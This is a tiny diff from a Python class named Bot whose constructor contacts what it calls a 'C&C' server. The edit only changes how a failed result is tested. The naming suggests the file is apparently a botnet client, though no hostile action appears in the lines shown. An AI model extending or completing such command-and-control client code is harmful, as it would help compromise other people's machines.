@@ -54,7 +54,7 @@ class Bot:
 
     def __init__(self):
         res = self.sendInfo()
-        if not res:
+        if res == False:
             print("C&C is not reachable!")
             return
         task = []
